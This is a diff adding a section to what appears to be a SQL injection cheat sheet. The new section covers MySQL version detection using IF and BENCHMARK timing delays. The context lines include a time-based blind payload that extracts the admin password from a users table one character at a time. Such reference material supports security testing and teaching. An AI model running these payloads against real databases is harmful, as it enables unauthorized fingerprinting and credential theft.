@@ -95,6 +95,23 @@ Time-based blind injection uses conditional logic with time delays:
 1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0)
 ```
 
+### Version Detection with IF and BENCHMARK
+
+Combine conditional logic with BENCHMARK for version-based timing attacks:
+
+```sql
+-- Causes delay if MySQL version starts with 5
+IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)
+
+-- More precise version check
+IF(MID(version(),1,3)='5.7', BENCHMARK(100000,SHA1(1)), 0)
+
+-- Check if version is 5.x.x
+SELECT IF(SUBSTRING(@@version,1,1)='5', BENCHMARK(5000000,MD5('x')), 0)
+```
+
+This technique combines version detection with timing-based data extraction.
+
 ### Boolean-based Injection Example
 
 ```sql
